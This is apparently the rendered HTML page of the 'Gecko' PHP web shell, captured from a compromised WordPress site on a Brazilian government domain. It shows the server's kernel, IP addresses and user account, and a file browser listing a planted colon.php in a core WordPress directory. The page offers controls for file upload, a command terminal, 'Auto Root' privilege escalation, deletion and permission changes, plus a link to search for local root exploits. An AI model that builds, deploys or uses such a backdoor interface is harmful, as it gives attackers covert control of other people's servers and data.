
<!-- GIF89;a -->
<!-- GIF89;a -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Hiy4hi4 [ esic.portonacional.to.gov.br ]</title>
    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

        body {
            font-family: sans-serif;
            background-color: #1A1A1D;
            color: white;
        }

        a {
            text-decoration: none;
            color: white;
        }

        tr th {
            text-align: center;
            font-weight: bold;
            padding: 10px;
        }

        tr td:nth-child(3) {
            text-align: center;
        }

        tr td {
            padding: 10px;
            font-weight: bold;
        }

        thead {
            background-color: #29292e;
            color: white;
        }

        ul {
            list-style: none;
        }

        ul li {
            font-weight: bold;
        }

        h1 {
            font-family: 'Nanum Brush Script', cursive;

        }

        tbody tr:nth-child(even) {
            background: #29292e;
        }

        .pwd {
            padding: 5px;
            background-color: #29292e;
        }

        form li {
            margin: 15px;
            margin-left: -5px;
        }

        form li input[type="file"] {
            border: 1px solid;
            padding: 3.5px 4px;
            background-color: #29292e;
            color: white;
            border-radius: 5px;
        }

        .upload-submit {
            float: left;
            padding: 6.4px 50px;
            margin-right: 10px;
            font-weight: bold;
            background-color: #29292e;
            border: none;
            color: #1e9fc7;
            box-shadow: 1.5px 1.5px #303038;
            border-radius: 3px;
        }

        .upload-submit:hover {
            background-color: #d5dbd6;
            color: black;
        }

        .link-shell:hover::after {
            content: "";
            border-bottom: 2px solid white;
            display: block;
            padding-bottom: 5px;
            margin-bottom: -7px;
            animation-name: link-shell;
            animation-duration: 0.6s;
        }

        @keyframes link-shell {
            from {
                width: 0;
            }

            to {
                width: 100%;
            }
        }

        .tool-menu li {
            display: inline-block;
            font-weight: none;
            padding: 13px 7px;
        }

        .tool-menu li a {
            padding: 7px 30px;
            color: #1e9fc7;
            background-color: #29292e;
            border-radius: 3px;
            box-shadow: 1.5px 1.5px #303038;
        }

        .tool-menu li a:hover {
            background-color: #d5dbd6;
            color: black;
            box-shadow: 1.5px 1.5px #d5dbd6;
        }

        .list-tool {
            padding: 1px;
        }

        .settings {
            float: right;
            position: relative;
            margin-top: -200px;

        }

        .settings select {
            padding: 5.5px 35px;
            background-color: #303038;
            border: none;
            color: white;
            border-radius: 4px;
        }

        .select-submit {
            padding: 6.5px 50px;
            margin-right: 10px;
            background-color: #303038;
            border: none;
            color: white;
            border-radius: 4px;
        }

        .select-submit:hover {
            background-color: #d5dbd6;
            color: black;
        }

        .action-gecko:hover {
            background-color: #d5dbd6;
            color: black;
        }

        .tool-menu-header {
            margin: -13px 0px;
        }

        .create {
            background-color: rgba(0, 0, 0, 0.3);
            position: fixed;
            display: flex;
            align-items: center;
            justify-content: center;
            top: 0;
            left: 0;
            height: 100vh;
            width: 100vw;
            animation: modal-box;
            animation-duration: 0.5s;
            animation-fill-mode: both;

        }

        @keyframes modal-box {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .modal {
            border-radius: 10px;
            background-color: white;
            color: black;
            width: 600px;
            max-width: 100%;
            padding: 18px;
        }

        .modal a {
            background-color: #29292e;
            padding: 8px 15px;
            border-radius: 3px;
        }

        .modal ul {
            float: right;
        }

        .modal ul li {
            display: inline;
        }

        .btn-modal {
            background-color: #29292e;
            color: white;
            border-radius: 3px;
            padding: 8px 15px;
            border: none;
        }

        .modal input[type="text"] {
            width: 100%;
            height: 30px;
            border-radius: 3px;
            border: 1px solid black;
        }

        .fw-bold {
            font-weight: bold;
        }

        .file-size {
            color: #1e9fc7;
        }

        th {
            color: #1e9fc7;
        }

        .fa-folder {
            color: orange;
        }

        .fa-file {
            color: #1e9fc7;
        }

        .terminal-content {
            z-index: 10;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            animation: modal-box;
            animation-duration: 0.5s;
            animation-fill-mode: both;
            font-weight: bold;
        }

        .terminal-body {
            margin: auto;
            margin-top: 60px;
            z-index: 20;
            width: 90%;
            background: white;
            height: 65vh;
            color: black;
            border-radius: 5px;
        }

        .terminal-body header {
            text-align: center;
            padding: 4px;
            background: #1A1A1D;
            color: white;
        }

        .terminal-body header a {
            float: right;
            color: black;
            font-size: large;
            background-color: white;
            position: relative;
            z-index: 11;
            border-radius: 5px;
            margin-top: -45px;
            padding: 10px 30px;
        }

        .terminal-body header a:hover {
            background-color: #29292e;
            color: white;
            border: 1px solid #303038;
        }

        .output-terminal {
            width: 99.5%;
            height: 100%;
            color: black;
            background-color: white;
        }

        .terminal-input {
            width: 90%;
            padding: 6px;
            margin-left: 1px;
            border: none;
            border-bottom: 2px solid black;
        }

        .terminal-submit {
            margin: 2.5px;
            padding: 7.5px 25px;
            background-color: black;
            color: white;
            border: none;
            border-radius: 3px;
        }

        .pwd-body {
            padding: 15px 8px;
            font-weight: bold;
        }


        .border {
            border: 1px solid black;
            border-radius: 2px;
        }

        .file-box {
            position: fixed;
            width: 100%;
            height: 100vh;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }

        .file-content {
            width: 90%;
            background-color: white;
            height: 70%;
            margin: auto;
            margin-top: 20px;
            color: black;
        }

        .file-content textarea {
            width: 99.5%;
            height: 70vh;
        }

        .file-header {
            background-color: #1A1A1D;
            padding: 15px;
        }

        .file-header ul {
            list-style: none;
        }

        .file-header li {
            display: inline-block;
            margin: 0px 30px;
        }

        .file-header li:nth-child(3) {
            float: right;
            margin-right: -5px;
        }

        .file-header li:nth-child(3) a {
            color: black;
            font-size: large;
            background-color: white;
            z-index: 11;
            border-radius: 5px;
            padding: 10px 30px;
        }

        .file-header li:nth-child(3) a:hover {
            background-color: #29292e;
            color: white;
            border: 1px solid #303038;
        }

        .file-header li button {
            color: black;
            cursor: pointer;
            font-weight: bold;
            background: white;
            font-size: 15px;
            border: 1px solid white;
            padding: 10px 15px;
            margin: -10px -15px;
            border-radius: 5px;
        }

        .link-rename {
            padding: 10px 15px;
            border: 1px solid white;
            background-color: white;
            color: black;
            border-radius: 5px;
            margin: -10px -15px;
        }
    </style>
</head>

<body>
    <div class="list-shell">
        <ul>
            <li>Linux webserver2020 4.19.0-8-686-pae #1 SMP Debian 4.19.98-1 (2020-01-26) i686</li>
            <li>Apache/2.4.38 (Debian)</li>
            <li>Server IP : 170.246.105.252 & Your IP : 114.5.16.109</li>
            <li>Domains : <font color=red size=2px>Cant Read [ /etc/named.conf ]</font></li>
            <li>
                User : www-data            </li>
            <form action="" method="post" enctype="multipart/form-data">
                <li><input type="file" name="gecko-file" id=""><input type="submit" class="upload-submit" name="upload-submit" value="Upload"></li>
            </form>
        </ul>
        <div class="tool-menu-header">
            <div class="list-tool">
                <ul class="tool-menu">
                    <li><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
                    <li><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&action=root-terminal" class=""><i class="fa-solid fa-code"></i>&nbsp;Auto Root</a></li>
                    <li><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
                    <li><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%204.19.0" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
                    <!-- <li><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Destroyer</a></li> -->
                    <li><a href="https://github.com/MadExploits/Gecko/" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
                </ul>
            </div>
        </div>
        <br>
    </div>
    <div class="border">
        <div class="pwd">
            <form action="" method="post">
                <div class="pwd-body">
                    <a href="?dir=2f"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a><a href="?dir=2f766172">var / </a><a href="?dir=2f7661722f777777">www / </a><a href="?dir=2f7661722f7777772f68746d6c">html / </a><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c">portonacional / </a><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c75646573">wp-includes / </a><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c65506965">SimplePie / </a><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e74">Content / </a><a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065">Type / </a>                </div>
                <div class="settings">
                    <select name="action-gecko" id="" class="action-gecko">
                        <option value="delete">Delete</option>
                        <option value="unzip">Unzip</option>
                    </select>
                    <input type="submit" class="select-submit" value="Submit" name="gecko-submit">
                </div>
        </div>
        <table style="width:100%;">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Date</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <!-- FOLDER NYA -->
                                                                                                        <!-- FILE NYA -->
                                                            <tr>
                            <td>
                                <input type="checkbox" name="check-gecko[]" id="folder" value="Sniffer.php">&nbsp;<label for="folder"><i class="fa-regular fa-file"></i>&nbsp;<a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f547970652f&f=Sniffer.php" class="link-shell">Sniffer.php</a>
                            </td>
                            <td>7.83 <span class="file-size">KB</span></td>
                            <td>
                                -rwxr-xr-x                            </td>
                            <td>
                                2021-04-15 11:33                            </td>
                            <td>
                                <a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&rename=Sniffer.php"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&download=Sniffer.php"><i class="fa-solid fa-download"></i></a>&nbsp;<a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&chmod=Sniffer.php"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
                            </td>
                        </tr>
                                                                                <tr>
                            <td>
                                <input type="checkbox" name="check-gecko[]" id="folder" value="colon.php">&nbsp;<label for="folder"><i class="fa-regular fa-file"></i>&nbsp;<a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f547970652f&f=colon.php" class="link-shell">colon.php</a>
                            </td>
                            <td>34.62 <span class="file-size">KB</span></td>
                            <td>
                                <font color="#00ff00">-rwxr-xr-x                            </td>
                            <td>
                                2023-06-02 09:07                            </td>
                            <td>
                                <a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&rename=colon.php"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&download=colon.php"><i class="fa-solid fa-download"></i></a>&nbsp;<a href="?dir=2f7661722f7777772f68746d6c2f706f72746f6e6163696f6e616c2f77702d696e636c756465732f53696d706c655069652f436f6e74656e742f54797065&chmod=colon.php"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
                            </td>
                        </tr>
                                                </tbody>
        </table>
    </div>
    <br>
    </form>
                    <br>
            </body>

</html>

